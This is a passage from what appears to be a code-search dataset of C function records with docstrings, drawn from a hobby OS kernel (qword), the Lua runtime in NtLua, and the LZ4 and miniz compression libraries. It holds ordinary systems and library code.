protocol.compatible_port_count);\n\n            extcap = old_ext;\n            controller->protocols[controller->num_protcols] = protocol;\n            controller->num_protcols++;\n        }\n\n        uint32_t *old = (uint32_t *)extcap;\n        extcap = (uint32_t *)((size_t)extcap + (((val >> 8) & 0xFF) << 2));\n        if (old == extcap) {\n            break;\n        }\n    }\n}", "path": "src\\usb\\hcd\\xhci.c", "repo_name": "qword-os/qword", "stars": 396, "license": "other", "language": "c", "size": 1396}
{"docstring": "/* Populate bitmap using e820 data. */\n", "func_signal": "void init_pmm(struct stivale_memmap_t *memmap)", "code": "{\n    mem_bitmap = initial_bitmap;\n    if (!(tmp_bitmap = pmm_allocz(BMREALLOC_STEP))) {\n        panic(NULL, 0, \"pmm_alloc failure in init_pmm()\");\n    }\n\n    tmp_bitmap = (uint32_t *)((size_t)tmp_bitmap + MEM_PHYS_OFFSET);\n\n    for (size_t i = 0; i < (BMREALLOC_STEP * PAGE_SIZE) / sizeof(uint32_t); i++)\n        tmp_bitmap[i] = 0xffffffff;\n\n    mem_bitmap = tmp_bitmap;\n\n    bitmap_entries = ((PAGE_SIZE / sizeof(uint32_t)) * 32) * BMREALLOC_STEP;\n\n    kprint(KPRN_INFO, \"pmm: Mapping memory\");\n\n    /* For each region specified by the memmap, iterate over each page which\n       fits in that region and if the region type indicates the area itself\n       is usable, write that page as free in the bitmap. Otherwise, mark the page as used. */\n    for (size_t i = 0; i < memmap->entries; i++) {\n        size_t aligned_base;\n        struct stivale_memmap_entry_t *entry = &(memmap->address[i]);\n\n        if (entry->base % PAGE_SIZE)\n            aligned_base = entry->base + (PAGE_SIZE - (entry->base % PAGE_SIZE));\n        else\n            aligned_base = entry->base;\n\n        size_t aligned_length = (entry->size / PAGE_SIZE) * PAGE_SIZE;\n\n        if ((entry->base % PAGE_SIZE) && aligned_length)\n            aligned_length -= PAGE_SIZE;\n\n        for (size_t j = 0; j * PAGE_SIZE < aligned_length; j++) {\n            size_t addr = aligned_base + j * PAGE_SIZE;\n\n            size_t page = addr / PAGE_SIZE;\n\n            if (addr < (MEMORY_BASE + PAGE_SIZE /* bitmap */))\n                continue;\n\n            if (addr >= (MEMORY_BASE + bitmap_entries * PAGE_SIZE)) {\n                /* Reallocate bitmap */\n                size_t cur_bitmap_size_in_pages = ((bitmap_entries / 32) * sizeof(uint32_t)) / PAGE_SIZE;\n                size_t new_bitmap_size_in_pages = cur_bitmap_size_in_pages + BMREALLOC_STEP;\n                if (!(tmp_bitmap = pmm_allocz(new_bitmap_size_in_pages))) {\n                    kprint(KPRN_ERR, \"pmm_alloc failure in init_pmm(). Halted.\");\n                    for (;;);\n                }\n                tmp_bitmap = (uint32_t *)((size_t)tmp_bitmap + MEM_PHYS_OFFSET);\n                /* Copy over previous bitmap */\n                for (size_t i = 0;\n                     i < (cur_bitmap_size_in_pages * PAGE_SIZE) / sizeof(uint32_t);\n                     i++)\n                    tmp_bitmap[i] = mem_bitmap[i];\n                /* Fill in the rest */\n                for (size_t i = (cur_bitmap_size_in_pages * PAGE_SIZE) / sizeof(uint32_t);\n                     i < (new_bitmap_size_in_pages * PAGE_SIZE) / sizeof(uint32_t);\n                     i++)\n                    tmp_bitmap[i] = 0xffffffff;\n                bitmap_entries += ((PAGE_SIZE / sizeof(uint32_t)) * 32) * BMREALLOC_STEP;\n                uint32_t *old_bitmap = (uint32_t *)((size_t)mem_bitmap - MEM_PHYS_OFFSET);\n                mem_bitmap = tmp_bitmap;\n                pmm_free(old_bitmap, cur_bitmap_size_in_pages);\n            }\n\n            if (entry->type == USABLE) {\n                total_pages++;\n                unset_bitmap(page, 1);\n            }\n        }\n    }\n}", "path": "src\\mm\\pmm.c", "repo_name": "qword-os/qword", "stars": 396, "license": "other", "language": "c", "size": 1396}
{"docstring": "/*\n** Read an integer numeral and raises an error if it is larger\n** than the maximum size for integers.\n*/\n", "func_signal": "static int getnumlimit (Header *h, const char **fmt, int df)", "code": "{\n  int sz = getnum(fmt, df);\n  if (sz > MAXINTSIZE || sz <= 0)\n    return luaL_error(h->L, \"integral size (%d) out of limits [1,%d]\",\n                            sz, MAXINTSIZE);\n  return sz;\n}", "path": "LuaLib\\lstrlib.c", "repo_name": "can1357/NtLua", "stars": 261, "license": "None", "language": "c", "size": 325}
{"docstring": "/* check whether pattern has no special characters */\n", "func_signal": "static int nospecials (const char *p, size_t l)", "code": "{\n  size_t upto = 0;\n  do {\n    if (strpbrk(p + upto, SPECIALS))\n      return 0;  /* pattern has a special character */\n    upto += strlen(p + upto) + 1;  /* may have more after \\0 */\n  } while (upto <= l);\n  return 1;  /* no special chars found */\n}", "path": "LuaLib\\lstrlib.c", "repo_name": "can1357/NtLua", "stars": 261, "license": "None", "language": "c", "size": 325}
{"docstring": "/*\n** mark metamethods for basic types\n*/\n", "func_signal": "static void markmt (global_State *g)", "code": "{\n  int i;\n  for (i=0; i < LUA_NUMTAGS; i++)\n    markobjectN(g, g->mt[i]);\n}", "path": "LuaLib\\lgc.c", "repo_name": "can1357/NtLua", "stars": 261, "license": "None", "language": "c", "size": 325}
{"docstring": "/*\n** traverse one gray object, turning it to black (except for threads,\n** which are always gray).\n*/\n", "func_signal": "static void propagatemark (global_State *g)", "code": "{\n  lu_mem size;\n  GCObject *o = g->gray;\n  lua_assert(isgray(o));\n  gray2black(o);\n  switch (o->tt) {\n    case LUA_TTABLE: {\n      Table *h = gco2t(o);\n      g->gray = h->gclist;  /* remove from 'gray' list */\n      size = traversetable(g, h);\n      break;\n    }\n    case LUA_TLCL: {\n      LClosure *cl = gco2lcl(o);\n      g->gray = cl->gclist;  /* remove from 'gray' list */\n      size = traverseLclosure(g, cl);\n      break;\n    }\n    case LUA_TCCL: {\n      CClosure *cl = gco2ccl(o);\n      g->gray = cl->gclist;  /* remove from 'gray' list */\n      size = traverseCclosure(g, cl);\n      break;\n    }\n    case LUA_TTHREAD: {\n      lua_State *th = gco2th(o);\n      g->gray = th->gclist;  /* remove from 'gray' list */\n      linkgclist(th, g->grayagain);  /* insert into 'grayagain' list */\n      black2gray(o);\n      size = traversethread(g, th);\n      break;\n    }\n    case LUA_TPROTO: {\n      Proto *p = gco2p(o);\n      g->gray = p->gclist;  /* remove from 'gray' list */\n      size = traverseproto(g, p);\n      break;\n    }\n    default: lua_assert(0); return;\n  }\n  g->GCmemtrav += size;\n}", "path": "LuaLib\\lgc.c", "repo_name": "can1357/NtLua", "stars": 261, "license": "None", "language": "c", "size": 325}
{"docstring": "/*\n** function to be used with macro \"fasttm\": optimized for absence of\n** tag methods\n*/\n", "func_signal": "const TValue *luaT_gettm (Table *events, TMS event, TString *ename)", "code": "{\n  const TValue *tm = luaH_getshortstr(events, ename);\n  lua_assert(event <= TM_EQ);\n  if (ttisnil(tm)) {  /* no tag method? */\n    events->flags |= cast_byte(1u<<event);  /* cache this fact */\n    return NULL;\n  }\n  else return tm;\n}", "path": "LuaLib\\ltm.c", "repo_name": "can1357/NtLua", "stars": 261, "license": "None", "language": "c", "size": 325}
{"docstring": "/*\n** mark all objects in list of being-finalized\n*/\n", "func_signal": "static void markbeingfnz (global_State *g)", "code": "{\n  GCObject *o;\n  for (o = g->tobefnz; o != NULL; o = o->next)\n    markobject(g, o);\n}", "path": "LuaLib\\lgc.c", "repo_name": "can1357/NtLua", "stars": 261, "license": "None", "language": "c", "size": 325}
{"docstring": "/*\n** Copy 'size' bytes from 'src' to 'dest', correcting endianness if\n** given 'islittle' is different from native endianness.\n*/\n", "func_signal": "static void copywithendian (volatile char *dest, volatile const char *src,\n                            int size, int islittle)", "code": "{\n  if (islittle == nativeendian.little) {\n    while (size-- != 0)\n      *(dest++) = *(src++);\n  }\n  else {\n    dest += size - 1;\n    while (size-- != 0)\n      *(dest--) = *(src++);\n  }\n}", "path": "LuaLib\\lstrlib.c", "repo_name": "can1357/NtLua", "stars": 261, "license": "None", "language": "c", "size": 325}
{"docstring": "/*\n** Traverse an ephemeron table and link it to proper list. Returns true\n** iff any object was marked during this traversal (which implies that\n** convergence has to continue). During propagation phase, keep table\n** in 'grayagain' list, to be visited again in the atomic phase. In\n** the atomic phase, if table has any white->white entry, it has to\n** be revisited during ephemeron convergence (as that key may turn\n** black). Otherwise, if it has any white key, table has to be cleared\n** (in the atomic phase).\n*/\n", "func_signal": "static int traverseephemeron (global_State *g, Table *h)", "code": "{\n  int marked = 0;  /* true if an object is marked in this traversal */\n  int hasclears = 0;  /* true if table has white keys */\n  int hasww = 0;  /* true if table has entry \"white-key -> white-value\" */\n  Node *n, *limit = gnodelast(h);\n  unsigned int i;\n  /* traverse array part */\n  for (i = 0; i < h->sizearray; i++) {\n    if (valiswhite(&h->array[i])) {\n      marked = 1;\n      reallymarkobject(g, gcvalue(&h->array[i]));\n    }\n  }\n  /* traverse hash part */\n  for (n = gnode(h, 0); n < limit; n++) {\n    checkdeadkey(n);\n    if (ttisnil(gval(n)))  /* entry is empty? */\n      removeentry(n);  /* remove it */\n    else if (iscleared(g, gkey(n))) {  /* key is not marked (yet)? */\n      hasclears = 1;  /* table must be cleared */\n      if (valiswhite(gval(n)))  /* value not marked yet? */\n        hasww = 1;  /* white-white entry */\n    }\n    else if (valiswhite(gval(n))) {  /* value not marked yet? */\n      marked = 1;\n      reallymarkobject(g, gcvalue(gval(n)));  /* mark it now */\n    }\n  }\n  /* link table into proper list */\n  if (g->gcstate == GCSpropagate)\n    linkgclist(h, g->grayagain);  /* must retraverse it in atomic phase */\n  else if (hasww)  /* table has white->white entries? */\n    linkgclist(h, g->ephemeron);  /* have to propagate again */\n  else if (hasclears)  /* table has white keys? */\n    linkgclist(h, g->allweak);  /* may have to clean white keys */\n  return marked;\n}", "path": "LuaLib\\lgc.c", "repo_name": "can1357/NtLua", "stars": 261, "license": "None", "language": "c", "size": 325}
{"docstring": "/*\n** sweep a list until a live object (or end of list)\n*/\n", "func_signal": "static GCObject **sweeptolive (lua_State *L, GCObject **p)", "code": "{\n  GCObject **old = p;\n  do {\n    p = sweeplist(L, p, 1);\n  } while (p == old);\n  return p;\n}", "path": "LuaLib\\lgc.c", "repo_name": "can1357/NtLua", "stars": 261, "license": "None", "language": "c", "size": 325}
{"docstring": "/*\n** mark root set and reset all gray lists, to start a new collection\n*/\n", "func_signal": "static void restartcollection (global_State *g)", "code": "{\n  g->gray = g->grayagain = NULL;\n  g->weak = g->allweak = g->ephemeron = NULL;\n  markobject(g, g->mainthread);\n  markvalue(g, &g->l_registry);\n  markmt(g);\n  markbeingfnz(g);  /* mark any finalizing object left from previous cycle */\n}", "path": "LuaLib\\lgc.c", "repo_name": "can1357/NtLua", "stars": 261, "license": "None", "language": "c", "size": 325}
{"docstring": "/*\n** open upvalues point to values in a thread, so those values should\n** be marked when the thread is traversed except in the atomic phase\n** (because then the value cannot be changed by the thread and the\n** thread may not be traversed again)\n*/\n", "func_signal": "static lu_mem traverseLclosure (global_State *g, LClosure *cl)", "code": "{\n  int i;\n  markobjectN(g, cl->p);  /* mark its prototype */\n  for (i = 0; i < cl->nupvalues; i++) {  /* mark its upvalues */\n    UpVal *uv = cl->upvals[i];\n    if (uv != NULL) {\n      if (upisopen(uv) && g->gcstate != GCSinsideatomic)\n        uv->u.open.touched = 1;  /* can be marked in 'remarkupvals' */\n      else\n        markvalue(g, uv->v);\n    }\n  }\n  return sizeLclosure(cl->nupvalues);\n}", "path": "LuaLib\\lgc.c", "repo_name": "can1357/NtLua", "stars": 261, "license": "None", "language": "c", "size": 325}
{"docstring": "/*\n** Return the name of the type of an object. For tables and userdata\n** with metatable, use their '__name' metafield, if present.\n*/\n", "func_signal": "const char *luaT_objtypename (lua_State *L, const TValue *o)", "code": "{\n  Table *mt;\n  if ((ttistable(o) && (mt = hvalue(o)->metatable) != NULL) ||\n      (ttisfulluserdata(o) && (mt = uvalue(o)->metatable) != NULL)) {\n    const TValue *name = luaH_getshortstr(mt, luaS_new(L, \"__name\"));\n    if (ttisstring(name))  /* is '__name' a string? */\n      return getstr(tsvalue(name));  /* use it as type name */\n  }\n  return ttypename(ttnov(o));  /* else use standard type name */\n}", "path": "LuaLib\\ltm.c", "repo_name": "can1357/NtLua", "stars": 261, "license": "None", "language": "c", "size": 325}
{"docstring": "/*\n** barrier for assignments to closed upvalues. Because upvalues are\n** shared among closures, it is impossible to know the color of all\n** closures pointing to it. So, we assume that the object being assigned\n** must be marked.\n*/\n", "func_signal": "void luaC_upvalbarrier_ (lua_State *L, UpVal *uv)", "code": "{\n  global_State *g = G(L);\n  GCObject *o = gcvalue(uv->v);\n  lua_assert(!upisopen(uv));  /* ensured by macro luaC_upvalbarrier */\n  if (keepinvariant(g))\n    markobject(g, o);\n}", "path": "LuaLib\\lgc.c", "repo_name": "can1357/NtLua", "stars": 261, "license": "None", "language": "c", "size": 325}
{"docstring": "/* translate a relative string position: negative means back from end */\n", "func_signal": "static lua_Integer posrelat (lua_Integer pos, size_t len)", "code": "{\n  if (pos >= 0) return pos;\n  else if (0u - (size_t)pos > len) return 0;\n  else return (lua_Integer)len + pos + 1;\n}", "path": "LuaLib\\lstrlib.c", "repo_name": "can1357/NtLua", "stars": 261, "license": "None", "language": "c", "size": 325}
{"docstring": "/* 0x3CA1A626, 0x33145C07 */\n", "func_signal": "double atan2(double y, double x)", "code": "{\n\tdouble z;\n\tuint32_t m,lx,ly,ix,iy;\n\n\tif (isnan(x) || isnan(y))\n\t\treturn x+y;\n\tEXTRACT_WORDS(ix, lx, x);\n\tEXTRACT_WORDS(iy, ly, y);\n\tif (((ix-0x3ff00000) | lx) == 0)  /* x = 1.0 */\n\t\treturn atan(y);\n\tm = ((iy>>31)&1) | ((ix>>30)&2);  /* 2*sign(x)+sign(y) */\n\tix = ix & 0x7fffffff;\n\tiy = iy & 0x7fffffff;\n\n\t/* when y = 0 */\n\tif ((iy|ly) == 0) {\n\t\tswitch(m) {\n\t\tcase 0:\n\t\tcase 1: return y;   /* atan(+-0,+anything)=+-0 */\n\t\tcase 2: return  pi; /* atan(+0,-anything) = pi */\n\t\tcase 3: return -pi; /* atan(-0,-anything) =-pi */\n\t\t}\n\t}\n\t/* when x = 0 */\n\tif ((ix|lx) == 0)\n\t\treturn m&1 ? -pi/2 : pi/2;\n\t/* when x is INF */\n\tif (ix == 0x7ff00000) {\n\t\tif (iy == 0x7ff00000) {\n\t\t\tswitch(m) {\n\t\t\tcase 0: return  pi/4;   /* atan(+INF,+INF) */\n\t\t\tcase 1: return -pi/4;   /* atan(-INF,+INF) */\n\t\t\tcase 2: return  3*pi/4; /* atan(+INF,-INF) */\n\t\t\tcase 3: return -3*pi/4; /* atan(-INF,-INF) */\n\t\t\t}\n\t\t} else {\n\t\t\tswitch(m) {\n\t\t\tcase 0: return  0.0; /* atan(+...,+INF) */\n\t\t\tcase 1: return -0.0; /* atan(-...,+INF) */\n\t\t\tcase 2: return  pi;  /* atan(+...,-INF) */\n\t\t\tcase 3: return -pi;  /* atan(-...,-INF) */\n\t\t\t}\n\t\t}\n\t}\n\t/* |y/x| > 0x1p64 */\n\tif (ix+(64<<20) < iy || iy == 0x7ff00000)\n\t\treturn m&1 ? -pi/2 : pi/2;\n\n\t/* z = atan(|y/x|) without spurious underflow */\n\tif ((m&2) && iy+(64<<20) < ix)  /* |y/x| < 0x1p-64, x<0 */\n\t\tz = 0;\n\telse\n\t\tz = atan(fabs(y/x));\n\tswitch (m) {\n\tcase 0: return z;              /* atan(+,+) */\n\tcase 1: return -z;             /* atan(-,+) */\n\tcase 2: return pi - (z-pi_lo); /* atan(+,-) */\n\tdefault: /* case 3 */\n\t\treturn (z-pi_lo) - pi; /* atan(-,-) */\n\t}\n}", "path": "KernelLuaVm\\crt\\libmd\\atan2.c", "repo_name": "can1357/NtLua", "stars": 261, "license": "None", "language": "c", "size": 325}
{"docstring": "/*\n** Performs a full GC cycle; if 'isemergency', set a flag to avoid\n** some operations which could change the interpreter state in some\n** unexpected ways (running finalizers and shrinking some structures).\n** Before running the collection, check 'keepinvariant'; if it is true,\n** there may be some objects marked as black, so the collector has\n** to sweep all objects to turn them back to white (as white has not\n** changed, nothing will be collected).\n*/\n", "func_signal": "void luaC_fullgc (lua_State *L, int isemergency)", "code": "{\n  global_State *g = G(L);\n  lua_assert(g->gckind == KGC_NORMAL);\n  if (isemergency) g->gckind = KGC_EMERGENCY;  /* set flag */\n  if (keepinvariant(g)) {  /* black objects? */\n    entersweep(L); /* sweep everything to turn them back to white */\n  }\n  /* finish any pending sweep phase to start a new cycle */\n  luaC_runtilstate(L, bitmask(GCSpause));\n  luaC_runtilstate(L, ~bitmask(GCSpause));  /* start new collection */\n  luaC_runtilstate(L, bitmask(GCScallfin));  /* run up to finalizers */\n  /* estimate must be correct after a full GC cycle */\n  lua_assert(g->GCestimate == gettotalbytes(g));\n  luaC_runtilstate(L, bitmask(GCSpause));  /* finish collection */\n  g->gckind = KGC_NORMAL;\n  setpause(g);\n}", "path": "LuaLib\\lgc.c", "repo_name": "can1357/NtLua", "stars": 261, "license": "None", "language": "c", "size": 325}
{"docstring": "/*\n** Pack integer 'n' with 'size' bytes and 'islittle' endianness.\n** The final 'if' handles the case when 'size' is larger than\n** the size of a Lua integer, correcting the extra sign-extension\n** bytes if necessary (by default they would be zeros).\n*/\n", "func_signal": "static void packint (luaL_Buffer *b, lua_Unsigned n,\n                     int islittle, int size, int neg)", "code": "{\n  char *buff = luaL_prepbuffsize(b, size);\n  int i;\n  buff[islittle ? 0 : size - 1] = (char)(n & MC);  /* first byte */\n  for (i = 1; i < size; i++) {\n    n >>= NB;\n    buff[islittle ? i : size - 1 - i] = (char)(n & MC);\n  }\n  if (neg && size > SZINT) {  /* negative number need sign extension? */\n    for (i = SZINT; i < size; i++)  /* correct extra bytes */\n      buff[islittle ? i : size - 1 - i] = (char)MC;\n  }\n  luaL_addsize(b, size);  /* add result to buffer */\n}", "path": "LuaLib\\lstrlib.c", "repo_name": "can1357/NtLua", "stars": 261, "license": "None", "language": "c", "size": 325}
{"docstring": "/* 3C81A626, 33145C07 */\n", "func_signal": "double __tan(double x, double y, int odd)", "code": "{\n\tdouble_t z, r, v, w, s, a;\n\tdouble w0, a0;\n\tuint32_t hx;\n\tint big, sign;\n\n\tGET_HIGH_WORD(hx,x);\n\tbig = (hx&0x7fffffff) >= 0x3FE59428; /* |x| >= 0.6744 */\n\tif (big) {\n\t\tsign = hx>>31;\n\t\tif (sign) {\n\t\t\tx = -x;\n\t\t\ty = -y;\n\t\t}\n\t\tx = (pio4 - x) + (pio4lo - y);\n\t\ty = 0.0;\n\t}\n\tz = x * x;\n\tw = z * z;\n\t/*\n\t * Break x^5*(T[1]+x^2*T[2]+...) into\n\t * x^5(T[1]+x^4*T[3]+...+x^20*T[11]) +\n\t * x^5(x^2*(T[2]+x^4*T[4]+...+x^22*[T12]))\n\t */\n\tr = T[1] + w*(T[3] + w*(T[5] + w*(T[7] + w*(T[9] + w*T[11]))));\n\tv = z*(T[2] + w*(T[4] + w*(T[6] + w*(T[8] + w*(T[10] + w*T[12])))));\n\ts = z * x;\n\tr = y + z*(s*(r + v) + y) + s*T[0];\n\tw = x + r;\n\tif (big) {\n\t\ts = 1 - 2*odd;\n\t\tv = s - 2.0 * (x + (r - w*w/(w + s)));\n\t\treturn sign ? -v : v;\n\t}\n\tif (!odd)\n\t\treturn w;\n\t/* -1.0/(x+r) has up to 2ulp error, so compute it accurately */\n\tw0 = w;\n\tSET_LOW_WORD(w0, 0);\n\tv = r - (w0 - x);       /* w0+v = r+x */\n\ta0 = a = -1.0 / w;\n\tSET_LOW_WORD(a0, 0);\n\treturn a0 + a*(1.0 + a0*w0 + a0*v);\n}", "path": "KernelLuaVm\\crt\\libmd\\__tan.c", "repo_name": "can1357/NtLua", "stars": 261, "license": "None", "language": "c", "size": 325}
{"docstring": "/*\n** Read and classify next option. 'size' is filled with option's size.\n*/\n", "func_signal": "static KOption getoption (Header *h, const char **fmt, int *size)", "code": "{\n  int opt = *((*fmt)++);\n  *size = 0;  /* default */\n  switch (opt) {\n    case 'b': *size = sizeof(char); return Kint;\n    case 'B': *size = sizeof(char); return Kuint;\n    case 'h': *size = sizeof(short); return Kint;\n    case 'H': *size = sizeof(short); return Kuint;\n    case 'l': *size = sizeof(long); return Kint;\n    case 'L': *size = sizeof(long); return Kuint;\n    case 'j': *size = sizeof(lua_Integer); return Kint;\n    case 'J': *size = sizeof(lua_Integer); return Kuint;\n    case 'T': *size = sizeof(size_t); return Kuint;\n    case 'f': *size = sizeof(float); return Kfloat;\n    case 'd': *size = sizeof(double); return Kfloat;\n    case 'n': *size = sizeof(lua_Number); return Kfloat;\n    case 'i': *size = getnumlimit(h, fmt, sizeof(int)); return Kint;\n    case 'I': *size = getnumlimit(h, fmt, sizeof(int)); return Kuint;\n    case 's': *size = getnumlimit(h, fmt, sizeof(size_t)); return Kstring;\n    case 'c':\n      *size = getnum(fmt, -1);\n      if (*size == -1)\n        luaL_error(h->L, \"missing size for format option 'c'\");\n      return Kchar;\n    case 'z': return Kzstr;\n    case 'x': *size = 1; return Kpadding;\n    case 'X': return Kpaddalign;\n    case ' ': break;\n    case '<': h->islittle = 1; break;\n    case '>': h->islittle = 0; break;\n    case '=': h->islittle = nativeendian.little; break;\n    case '!': h->maxalign = getnumlimit(h, fmt, MAXALIGN); break;\n    default: luaL_error(h->L, \"invalid format option '%c'\", opt);\n  }\n  return Knop;\n}", "path": "LuaLib\\lstrlib.c", "repo_name": "can1357/NtLua", "stars": 261, "license": "None", "language": "c", "size": 325}
{"docstring": "/*\n** get GC debt and convert it from Kb to 'work units' (avoid zero debt\n** and overflows)\n*/\n", "func_signal": "static l_mem getdebt (global_State *g)", "code": "{\n  l_mem debt = g->GCdebt;\n  int stepmul = g->gcstepmul;\n  if (debt <= 0) return 0;  /* minimal debt */\n  else {\n    debt = (debt / STEPMULADJ) + 1;\n    debt = (debt < MAX_LMEM / stepmul) ? debt * stepmul : MAX_LMEM;\n    return debt;\n  }\n}", "path": "LuaLib\\lgc.c", "repo_name": "can1357/NtLua", "stars": 261, "license": "None", "language": "c", "size": 325}
{"docstring": "/* faster */\n", "func_signal": "static U32 LZ4HC_hashPtr(const void* ptr)", "code": "{ return HASH_FUNCTION(LZ4_read32(ptr)); }\n\n\n\n/**************************************\n*  HC Compression\n**************************************/\nstatic void LZ4HC_init (LZ4HC_CCtx_internal* hc4, const BYTE* start)\n{\n    MEM_INIT((void*)hc4->hashTable, 0, sizeof(hc4->hashTable));\n    MEM_INIT(hc4->chainTable, 0xFF, sizeof(hc4->chainTable));\n    hc4->nextToUpdate = 64 KB;\n    hc4->base = start - 64 KB;\n    hc4->end = start;\n    hc4->dictBase = start - 64 KB;\n    hc4->dictLimit = 64 KB;\n    hc4->lowLimit = 64 KB;\n}", "path": "app\\src\\main\\cpp\\libuabe\\lz4\\lz4hc.c", "repo_name": "xausky/UnityModManager", "stars": 322, "license": "gpl-3.0", "language": "c", "size": 6669}
{"docstring": "/* #ifndef MINIZ_NO_TIME */\n", "func_signal": "static MZ_FORCEINLINE mz_bool mz_zip_set_error(mz_zip_archive *pZip, mz_zip_error err_num)", "code": "{\n    if (pZip)\n        pZip->m_last_error = err_num;\n    return MZ_FALSE;\n}", "path": "app\\src\\main\\cpp\\libuabe\\miniz\\miniz.c", "repo_name": "xausky/UnityModManager", "stars": 322, "license": "gpl-3.0", "language": "c", "size": 6669}
{"docstring": "/***********************************\n*  Deprecated Functions\n***********************************/\n/* These functions currently generate deprecation warnings */\n/* Deprecated compression functions */\n", "func_signal": "int LZ4_compressHC(const char* src, char* dst, int srcSize)", "code": "{ return LZ4_compress_HC (src, dst, srcSize, LZ4_compressBound(srcSize), 0); }\nint LZ4_compressHC_limitedOutput(const char* src, char* dst, int srcSize, int maxDstSize) { return LZ4_compress_HC(src, dst, srcSize, maxDstSize, 0); }\nint LZ4_compressHC2(const char* src, char* dst, int srcSize, int cLevel) { return LZ4_compress_HC (src, dst, srcSize, LZ4_compressBound(srcSize), cLevel); }\nint LZ4_compressHC2_limitedOutput(const char* src, char* dst, int srcSize, int maxDstSize, int cLevel) { return LZ4_compress_HC(src, dst, srcSize, maxDstSize, cLevel); }\nint LZ4_compressHC_withStateHC (void* state, const char* src, char* dst, int srcSize) { return LZ4_compress_HC_extStateHC (state, src, dst, srcSize, LZ4_compressBound(srcSize), 0); }\nint LZ4_compressHC_limitedOutput_withStateHC (void* state, const char* src, char* dst, int srcSize, int maxDstSize) { return LZ4_compress_HC_extStateHC (state, src, dst, srcSize, maxDstSize, 0); }\nint LZ4_compressHC2_withStateHC (void* state, const char* src, char* dst, int srcSize, int cLevel) { return LZ4_compress_HC_extStateHC(state, src, dst, srcSize, LZ4_compressBound(srcSize), cLevel); }\nint LZ4_compressHC2_limitedOutput_withStateHC (void* state, const char* src, char* dst, int srcSize, int maxDstSize, int cLevel) { return LZ4_compress_HC_extStateHC(state, src, dst, srcSize, maxDstSize, cLevel); }\nint LZ4_compressHC_continue (LZ4_streamHC_t* ctx, const char* src, char* dst, int srcSize) { return LZ4_compress_HC_continue (ctx, src, dst, srcSize, LZ4_compressBound(srcSize)); }\nint LZ4_compressHC_limitedOutput_continue (LZ4_streamHC_t* ctx, const char* src, char* dst, int srcSize, int maxDstSize) { return LZ4_compress_HC_continue (ctx, src, dst, srcSize, maxDstSize); }\n\n\n/* Deprecated streaming functions */\nint LZ4_sizeofStreamStateHC(void) { return LZ4_STREAMHCSIZE; }\n\nint LZ4_resetStreamStateHC(void* state, char* inputBuffer)\n{\n    LZ4HC_CCtx_internal *ctx = &((LZ4_streamHC_t*)state)->internal_donotuse;\n    if ((((size_t)state) & (sizeof(void*)-1)) != 0) return 1;   /* Error : pointer is not aligned for pointer (32 or 64 bits) */\n    LZ4HC_init(ctx, (const BYTE*)inputBuffer);\n    ctx->inputBuffer = (BYTE*)inputBuffer;\n    return 0;\n}", "path": "app\\src\\main\\cpp\\libuabe\\lz4\\lz4hc.c", "repo_name": "xausky/UnityModManager", "stars": 322, "license": "gpl-3.0", "language": "c", "size": 6669}
{"docstring": "/* Note: Just because the archive is not zip64 doesn't necessarily mean it doesn't have Zip64 extended information extra field, argh. */\n", "func_signal": "mz_bool mz_zip_is_zip64(mz_zip_archive *pZip)", "code": "{\n    if ((!pZip) || (!pZip->m_pState))\n        return MZ_FALSE;\n\n    return pZip->m_pState->m_zip64;\n}", "path": "app\\src\\main\\cpp\\libuabe\\miniz\\miniz.c", "repo_name": "xausky/UnityModManager", "stars": 322, "license": "gpl-3.0", "language": "c", "size": 6669}
{"docstring": "/* Update chains up to ip (excluded) */\n", "func_signal": "LZ4_FORCE_INLINE void LZ4HC_Insert (LZ4HC_CCtx_internal* hc4, const BYTE* ip)", "code": "{\n    U16* const chainTable = hc4->chainTable;\n    U32* const hashTable  = hc4->hashTable;\n    const BYTE* const base = hc4->base;\n    U32 const target = (U32)(ip - base);\n    U32 idx = hc4->nextToUpdate;\n\n    while (idx < target) {\n        U32 const h = LZ4HC_hashPtr(base+idx);\n        size_t delta = idx - hashTable[h];\n        if (delta>MAX_DISTANCE) delta = MAX_DISTANCE;\n        DELTANEXTU16(chainTable, idx) = (U16)delta;\n        hashTable[h] = idx;\n        idx++;\n    }\n\n    hc4->nextToUpdate = target;\n}", "path": "app\\src\\main\\cpp\\libuabe\\lz4\\lz4hc.c", "repo_name": "xausky/UnityModManager", "stars": 322, "license": "gpl-3.0", "language": "c", "size": 6669}
{"docstring": "/* #ifndef MINIZ_NO_STDIO */\n", "func_signal": "mz_bool mz_zip_writer_init_from_reader_v2(mz_zip_archive *pZip, const char *pFilename, mz_uint flags)", "code": "{\n    mz_zip_internal_state *pState;\n\n    if ((!pZip) || (!pZip->m_pState) || (pZip->m_zip_mode != MZ_ZIP_MODE_READING))\n        return mz_zip_set_error(pZip, MZ_ZIP_INVALID_PARAMETER);\n\n    if (flags & MZ_ZIP_FLAG_WRITE_ZIP64)\n    {\n        /* We don't support converting a non-zip64 file to zip64 - this seems like more trouble than it's worth. (What about the existing 32-bit data descriptors that could follow the compressed data?) */\n        if (!pZip->m_pState->m_zip64)\n            return mz_zip_set_error(pZip, MZ_ZIP_INVALID_PARAMETER);\n    }\n\n    /* No sense in trying to write to an archive that's already at the support max size */\n    if (pZip->m_pState->m_zip64)\n    {\n        if (pZip->m_total_files == MZ_UINT32_MAX)\n            return mz_zip_set_error(pZip, MZ_ZIP_TOO_MANY_FILES);\n    }\n    else\n    {\n        if (pZip->m_total_files == MZ_UINT16_MAX)\n            return mz_zip_set_error(pZip, MZ_ZIP_TOO_MANY_FILES);\n\n        if ((pZip->m_archive_size + MZ_ZIP_CENTRAL_DIR_HEADER_SIZE + MZ_ZIP_LOCAL_DIR_HEADER_SIZE) > MZ_UINT32_MAX)\n            return mz_zip_set_error(pZip, MZ_ZIP_FILE_TOO_LARGE);\n    }\n\n    pState = pZip->m_pState;\n\n    if (pState->m_pFile)\n    {\n#ifdef MINIZ_NO_STDIO\n        (void)pFilename;\n        return mz_zip_set_error(pZip, MZ_ZIP_INVALID_PARAMETER);\n#else\n        if (pZip->m_pIO_opaque != pZip)\n            return mz_zip_set_error(pZip, MZ_ZIP_INVALID_PARAMETER);\n\n        if (pZip->m_zip_type == MZ_ZIP_TYPE_FILE)\n        {\n            if (!pFilename)\n                return mz_zip_set_error(pZip, MZ_ZIP_INVALID_PARAMETER);\n\n            /* Archive is being read from stdio and was originally opened only for reading. Try to reopen as writable. */\n            if (NULL == (pState->m_pFile = MZ_FREOPEN(pFilename, \"r+b\", pState->m_pFile)))\n            {\n                /* The mz_zip_archive is now in a bogus state because pState->m_pFile is NULL, so just close it. */\n                mz_zip_reader_end_internal(pZip, MZ_FALSE);\n                return mz_zip_set_error(pZip, 